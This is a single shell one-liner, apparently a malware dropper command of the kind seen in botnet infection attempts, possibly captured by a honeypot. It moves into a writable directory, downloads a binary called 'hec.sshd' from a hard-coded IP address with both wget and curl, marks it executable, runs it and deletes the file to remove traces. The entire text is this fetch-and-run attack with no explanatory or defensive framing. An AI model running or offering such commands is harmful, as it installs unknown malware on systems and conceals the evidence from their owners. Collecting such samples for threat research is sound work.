cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.176.232.239/hec.sshd; curl -O http://94.176.232.239/hec.sshd; chmod +x hec.sshd; ./hec.sshd; rm -rf hec.sshd
